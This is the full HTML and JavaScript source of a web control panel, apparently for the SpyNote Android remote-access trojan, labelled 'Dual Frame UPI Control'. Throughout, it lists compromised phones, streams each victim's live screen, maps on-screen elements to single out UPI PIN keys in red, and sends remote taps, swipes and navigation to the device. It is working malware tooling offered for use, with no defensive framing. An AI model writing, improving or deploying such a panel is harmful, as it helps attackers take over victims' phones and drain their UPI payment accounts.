<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Pro v7.3.1 - Dual Frame UPI Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
            background: #0a0a0a; color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; background: rgba(0,0,0,0.95); 
            padding: 20px; max-height: 85vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #333;
        }
        .device { padding: 15px; margin: 10px 0; background: #222; cursor: pointer; 
            border-radius: 10px; transition: all 0.3s; border: 1px solid #444; }
        .device:hover { background: #444; transform: translateX(8px); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; box-shadow: 0 0 20px #00ff88; }
        .disconnected { opacity: 0.4; }

        #dual-frames {
            display: flex; gap: 20px; position: absolute; top: 50%; left: 50%; 
            transform: translate(-50%, -50%); max-width: 95vw; max-height: 75vh;
        }
        .phone-frame {
            width: 340px; height: 740px; background: #111; border: 25px solid #222; 
            border-radius: 50px; position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 25px 50px rgba(0,0,0,0.8), inset 0 0 20px rgba(255,255,255,0.1);
            flex: 1;
        }
        #screen-canvas { width: 100%; height: 100%; background: #000; border-radius: 25px; image-rendering: pixelated; }
        #layout-canvas { 
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            pointer-events: none; border-radius: 25px; z-index: 20; background: rgba(0,0,0,0.1);
        }
        .frame-label {
            position: absolute; top: -35px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.9); padding: 5px 15px; border-radius: 20px;
            font-size: 12px; font-weight: 600; backdrop-filter: blur(10px);
        }
        #screen-label { color: #00ff88; }
        #layout-label { color: #ff6b6b; }

        .layout-element {
            position: absolute; background: rgba(0,255,136,0.4); border: 2px solid #00ff88;
            border-radius: 6px; transition: all 0.2s; cursor: pointer; pointer-events: all;
        }
        .layout-element:hover { background: rgba(0,255,136,0.7); transform: scale(1.05) !important; }
        .pin-element { background: rgba(255,69,0,0.7) !important; border-color: #ff4444 !important; }
        .pin-element:hover { background: rgba(255,69,0,1) !important; box-shadow: 0 0 15px #ff4444; }

        #stats { 
            position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.9); 
            padding: 15px; border-radius: 10px; font-size: 13px; text-align: center; 
            backdrop-filter: blur(10px); border: 1px solid #333; min-width: 200px;
        }
        #controls { 
            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%); 
            display: flex; gap: 10px; background: rgba(0,0,0,0.9); padding: 15px 25px;
            border-radius: 30px; backdrop-filter: blur(20px); border: 1px solid #444;
        }
        button {
            padding: 12px 20px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 20px; cursor: pointer; 
            font-weight: 600; transition: all 0.3s; box-shadow: 0 5px 20px rgba(0,123,255,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(0,123,255,0.6); }
        .layout-toggle { background: linear-gradient(45deg, #ff6b6b, #ee5a5a); }
        .layout-toggle.active { background: linear-gradient(45deg, #00ff88, #00cc6a); }
        .frame-toggle { background: linear-gradient(45deg, #ffaa00, #ff8800); }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 15px; color: #00ff88;">üì± Devices Online</h3>
        <div id="device-list">Loading devices...</div>
    </div>
    
    <div id="stats">
        <div>Status: <span id="status" style="color: #ff6b6b;">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Ping: <span id="ping">-</span></div>
        <div>Device: <span id="deviceName">-</span></div>
        <div>Layout: <span id="layoutCount">0</span> elements</div>
    </div>

    <div id="dual-frames">
        <!-- Screen Frame -->
        <div class="phone-frame" id="screen-frame">
            <div class="frame-label" id="screen-label">üñ•Ô∏è LIVE SCREEN</div>
            <canvas id="screen-canvas"></canvas>
        </div>
        
        <!-- Layout Frame -->
        <div class="phone-frame" id="layout-frame">
            <div class="frame-label" id="layout-label">üéØ UPI LAYOUT (Click PINs)</div>
            <canvas id="layout-canvas"></canvas>
        </div>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="sendHome()">üè† Home</button>
        <button onclick="toggleLayout()" id="layoutBtn" class="layout-toggle">üó∫Ô∏è Layout ON</button>
        <button onclick="toggleFrames()" id="frameBtn" class="frame-toggle">üì± Dual‚ÜíSingle</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let frameCount = 0, lastFrameTime = 0, avgFps = 0;
        let frameQueue = [];
        let layoutData = [];
        let showLayout = true, showDualFrames = true;
        let canvas, screenCtx, layoutCanvas, layoutCtx;
        let layoutElements = [];
        let pingInterval;

        // Initialize canvases
        canvas = document.getElementById('screen-canvas');
        screenCtx = canvas.getContext('2d');
        layoutCanvas = document.getElementById('layout-canvas');
        layoutCtx = layoutCanvas.getContext('2d');

        socket.on('connect', () => {
            document.getElementById('status').textContent = 'üü¢ LIVE';
            document.getElementById('status').style.color = '#00ff88';
            pingInterval = setInterval(() => socket.emit('ping'), 5000);
        });

        socket.on('pong', () => {
            document.getElementById('ping').textContent = '‚úì';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            frameQueue.push(data);
            if (frameQueue.length === 1) renderNextFrame();
            
            // Update layout data
            if (data.layout) layoutData = data.layout;
            
            frameCount++;
            const now = performance.now();
            if (now - lastFrameTime >= 1000) {
                avgFps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                document.getElementById('fps').textContent = avgFps;
                document.getElementById('layoutCount').textContent = layoutData.length;
                frameCount = 0;
                lastFrameTime = now;
            }
        });

        function renderNextFrame() {
            if (frameQueue.length === 0) return;
            
            const data = frameQueue.shift();
            const img = new Image();
            
            img.onload = () => {
                // Screen Frame
                const screenRect = document.getElementById('screen-frame').getBoundingClientRect();
                canvas.width = screenRect.width;
                canvas.height = screenRect.height;
                screenCtx.imageSmoothingEnabled = false;
                screenCtx.clearRect(0, 0, canvas.width, canvas.height);
                screenCtx.drawImage(img, 0, 0, canvas.width, canvas.height);
                
                // Layout Frame (always render if dual frames)
                if (showDualFrames) {
                    renderLayoutFrame(screenRect);
                }
                
                if (frameQueue.length > 0) {
                    requestAnimationFrame(renderNextFrame);
                }
            };
            
            img.src = `data:image/jpeg;base64,${data.data}`;
            deviceWidth = data.width || 1080;
            deviceHeight = data.height || 2400;
        }

        function renderLayoutFrame(rect) {
            layoutCanvas.width = rect.width;
            layoutCanvas.height = rect.height;
            layoutCtx.clearRect(0, 0, rect.width, rect.height);
            layoutElements = [];
            
            layoutData.forEach((element, index) => {
                const x = (element.bounds.left / deviceWidth) * rect.width;
                const y = (element.bounds.top / deviceHeight) * rect.height;
                const w = ((element.bounds.right - element.bounds.left) / deviceWidth) * rect.width;
                const h = ((element.bounds.bottom - element.bounds.top) / deviceHeight) * rect.height;
                
                const isPin = element.text && (element.text.match(/\d/) || element.contentDescription?.match(/\d/));
                const isDone = element.text?.toLowerCase().includes('done') || element.contentDescription?.toLowerCase().includes('done');
                
                // Draw element
                layoutCtx.fillStyle = isPin ? 'rgba(255,69,0,0.6)' : (isDone ? 'rgba(255,215,0,0.6)' : 'rgba(0,255,136,0.4)');
                layoutCtx.strokeStyle = isPin ? '#ff4444' : (isDone ? '#ffd700' : '#00ff88');
                layoutCtx.lineWidth = 3;
                layoutCtx.strokeRect(x, y, w, h);
                layoutCtx.lineWidth = 1;
                layoutCtx.fillRect(x, y, w, h);
                
                // Text label
                layoutCtx.font = 'bold 16px monospace';
                layoutCtx.fillStyle = isPin ? '#ff4444' : (isDone ? '#ffd700' : '#00ff88');
                layoutCtx.textAlign = 'left';
                const label = (element.text?.slice(0,6) || element.contentDescription?.slice(0,6) || 'Element').trim();
                layoutCtx.fillText(label, x+8, y+24);
                
                layoutElements.push({ 
                    x, y, w, h, 
                    isPin, isDone, 
                    centerX: (x + w/2), centerY: (y + h/2),
                    element, index 
                });
            });
        }

        function updateDeviceList(devices) {
            document.getElementById('device-list').innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model?.slice(0,12) || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''} Android ${info.version || ''}</small><br>
                        <span style="color: ${info.connected ? '#00ff88' : '#ff6b6b'}">
                            ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFF'}
                        </span>
                    </div>
                `).join('') : '<div style="color:#666;">No devices</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.getElementById('deviceName').textContent = deviceId.slice(0,12);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            frameQueue = [];
        }

        function getScaledCoords(clientX, clientY, frameId) {
            const rect = document.getElementById(frameId).getBoundingClientRect();
            return {
                x: Math.floor((clientX - rect.left) * (deviceWidth / rect.width)),
                y: Math.floor((clientY - rect.top) * (deviceHeight / rect.height))
            };
        }

        // Touch/Mouse events for BOTH frames
        ['mousedown', 'mousemove', 'mouseup'].forEach(event => {
            ['screen-frame', 'layout-frame'].forEach(frameId => {
                document.getElementById(frameId).addEventListener(event, (e) => {
                    e.preventDefault();
                    handleInput(e, event, frameId);
                });
            });
        });

        ['touchstart', 'touchmove', 'touchend'].forEach(event => {
            ['screen-frame', 'layout-frame'].forEach(frameId => {
                document.getElementById(frameId).addEventListener(event, (e) => {
                    e.preventDefault();
                    const touch = e.touches[0] || e.changedTouches[0];
                    const fakeEvent = { clientX: touch.clientX, clientY: touch.clientY };
                    handleInput(fakeEvent, event, frameId);
                }, { passive: false });
            });
        });

        let isDragging = false, dragStart = {};
        function handleInput(e, eventType, frameId) {
            const coords = getScaledCoords(e.clientX, e.clientY, frameId);
            
            if (eventType === 'mousedown' || eventType === 'touchstart') {
                isDragging = true;
                dragStart = coords;
                
                // Layout frame: Click PIN directly
                if (frameId === 'layout-frame') {
                    const clickedElement = layoutElements.find(el => 
                        coords.x >= el.x && coords.x <= (el.x + el.w) &&
                        coords.y >= el.y && coords.y <= (el.y + el.h)
                    );
                    if (clickedElement) {
                        sendTap(clickedElement.centerX * (deviceWidth / document.getElementById(frameId).getBoundingClientRect().width), 
                                clickedElement.centerY * (deviceHeight / document.getElementById(frameId).getBoundingClientRect().height));
                        console.log('üéØ PIN TAPPED:', clickedElement.element.text || clickedElement.element.contentDescription);
                        return;
                    }
                }
                sendTap(coords.x, coords.y);
                
            } else if ((eventType === 'mousemove' || eventType === 'touchmove') && isDragging) {
                sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
            } else if (eventType === 'mouseup' || eventType === 'touchend') {
                isDragging = false;
            }
        }

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey, duration: 250 
            });
        }

        function sendBack() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'back' }); }
        function sendHome() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'home' }); }

        function toggleLayout() {
            showLayout = !showLayout;
            const btn = document.getElementById('layoutBtn');
            btn.textContent = showLayout ? 'üìã Hide Layout' : 'üó∫Ô∏è Show Layout';
            btn.classList.toggle('active');
        }

        function toggleFrames() {
            showDualFrames = !showDualFrames;
            const btn = document.getElementById('frameBtn');
            const dualFrames = document.getElementById('dual-frames');
            
            if (showDualFrames) {
                dualFrames.style.display = 'flex';
                btn.textContent = 'üì± Dual‚ÜíSingle';
                btn.style.background = 'linear-gradient(45deg, #ffaa00, #ff8800)';
                document.getElementById('layout-frame').style.display = 'block';
            } else {
                dualFrames.style.flexDirection = 'column';
                dualFrames.style.gap = '10px';
                btn.textContent = 'üì± Single‚ÜíDual';
                btn.style.background = 'linear-gradient(45deg, #00ff88, #00cc6a)';
                btn.classList.add('active');
            }
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }
    </script>
</body>
</html>
